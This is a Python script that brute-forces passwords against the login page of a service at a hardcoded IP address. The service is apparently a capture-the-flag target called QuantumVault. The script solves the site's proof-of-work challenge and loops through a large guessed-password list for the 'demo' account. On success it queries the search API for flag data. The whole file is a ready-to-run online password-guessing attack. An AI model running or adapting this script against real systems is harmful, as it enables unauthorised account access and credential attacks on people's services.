#!/usr/bin/env python3
"""
Ultimate password list for QuantumVault
"""

import requests
from bs4 import BeautifulSoup
import hashlib
import time

BASE_URL = "http://138.199.163.92:16969"

def sha256hex(text):
    return hashlib.sha256(text.encode()).hexdigest()

def solve_pow(challenge):
    target = 2 ** (256 - 18)
    for nonce in range(500000):
        if int(sha256hex(challenge + str(nonce)), 16) < target:
            return nonce
    return None

def try_login(username, password, challenge, nonce):
    data = {
        'pow_challenge': challenge,
        'pow_nonce': str(nonce),
        'username': username,
        'password': password
    }
    session = requests.Session()
    resp = session.post(f"{BASE_URL}/login", data=data, allow_redirects=False)
    
    if resp.status_code == 302:
        print(f"\n{'='*60}")
        print(f"[!!!] SUCCESS! {username}:{password}")
        print(f"{'='*60}")
        
        # Access protected resources
        search = session.get(f"{BASE_URL}/api/search")
        print(f"\nAPI Search: {search.text}")
        
        for q in ['', 'flag', 'Kaal', '*']:
            r = session.get(f"{BASE_URL}/api/search", params={'q': q})
            if r.text:
                print(f"Search q={q}: {r.text}")
        
        return True
    return False

# MASSIVE password list
passwords = [
    # Empty and whitespace
    '', ' ', '  ', '\t', '\n',
    
    # Single chars
    'a', 'A', '1', '0',
    
    # Very common
    'password', 'Password', 'PASSWORD', '123456', '12345678', '1234567890',
    'qwerty', 'abc123', 'password123', 'Password123', 'letmein',
    
    # Demo variations
    'demo', 'Demo', 'DEMO', 'demo1', 'demo123', 'Demo123', 'demo2026', 'Demo2026',
    'demo_user', 'demouser', 'demo-user', 'demo_password', 'demopassword',
    
    # Admin variations
    'admin', 'Admin', 'ADMIN', 'admin1', 'admin123', 'Admin123', 'admin2026', 'Admin2026',
    'administrator', 'Administrator', 'ADMINISTRATOR',
    
    # Quantum/Vault related
    'quantumvault', 'QuantumVault', 'QUANTUMVAULT', 'Quantumvault',
    'quantum', 'Quantum', 'QUANTUM', 'quantum123', 'Quantum123',
    'vault', 'Vault', 'VAULT', 'vault123', 'Vault123',
    'quantum-vault', 'quantum_vault', 'quantumVault',
    'qv', 'QV', 'qvi', 'QVI',
    
    # Security related
    'unhackable', 'Unhackable', 'UNHACKABLE',
    'unbreakable', 'Unbreakable', 'UNBREAKABLE',
    'secure', 'Secure', 'SECURE', 'security', 'Security',
    'encrypted', 'Encrypted', 'encryption', 'Encryption',
    'classified', 'Classified', 'CLASSIFIED',
    'topsecret', 'TopSecret', 'TOPSECRET', 'top-secret',
    'secret', 'Secret', 'SECRET', 'secret123',
    
    # Government/Whistleblower
    'government', 'Government', 'GOVERNMENT',
    'whistleblower', 'Whistleblower', 'WHISTLEBLOWER',
    'classified', 'document', 'Document',
    
    # Flag related
    'Kaal', 'kaal', 'KAAL', 'Kaal{}', 'Kaal{', 'flag', 'Flag', 'FLAG',
    'ctf', 'CTF', 'Ctf',
    
    # Years
    '2026', '2025', '2024', '2023', '2022',
    
    # Default/Weak
    'guest', 'Guest', 'GUEST', 'guest123',
    'test', 'Test', 'TEST', 'test123', 'Test123',
    'user', 'User', 'USER', 'user123', 'User123',
    'default', 'Default', 'DEFAULT',
    'welcome', 'Welcome', 'WELCOME', 'welcome123',
    'changeme', 'ChangeMe', 'CHANGEME',
    
    # Common patterns
    'password1', 'Password1', 'password!', 'Password!',
    'admin1', 'Admin1', 'admin!', 'Admin!',
    'demo!', 'Demo!', 'demo@123', 'Demo@123',
    
    # Combinations
    'quantum2026', 'vault2026', 'quantumvault2026',
    'admin2026', 'demo2026', 'password2026',
    'qv2026', 'QV2026',
    
    # CTF common
    'flag{', 'FLAG{', 'Kaal{',
    'root', 'Root', 'ROOT', 'toor',
    'pass', 'Pass', 'PASS',
    
    # Weak patterns
    '111111', '000000', '123123', '321321',
    'aaaaaa', 'AAAAAA', 'qqqqqq',
    
    # Company name variations
    'quantumvaultindustries', 'QuantumVaultIndustries',
    'industries', 'Industries',
    
    # Article/Blog related (from challenge description)
    'article', 'Article', 'blog', 'Blog',
    'overconfident', 'Overconfident',
    
    # Misc
    'backup', 'Backup', 'temp', 'Temp', 'temporary',
    'public', 'Public', 'private', 'Private',
    'access', 'Access', 'granted', 'Granted',
]

print("="*60)
print("ULTIMATE PASSWORD ATTACK")
print("="*60)

challenge = requests.get(f"{BASE_URL}/login")
soup = BeautifulSoup(challenge.text, 'html.parser')
chal = soup.find('input', {'name': 'pow_challenge'})['value']

print(f"[*] Challenge: {chal}")
print(f"[*] Solving PoW...")
nonce = solve_pow(chal)
print(f"[+] PoW solved: {nonce}")

print(f"\n[*] Trying {len(passwords)} passwords...")

for i, pwd in enumerate(passwords):
    if i % 20 == 0:
        print(f"  Progress: {i}/{len(passwords)}")
    
    if try_login('demo', pwd, chal, nonce):
        exit(0)
    
    time.sleep(0.2)

print("\n[-] No password found")
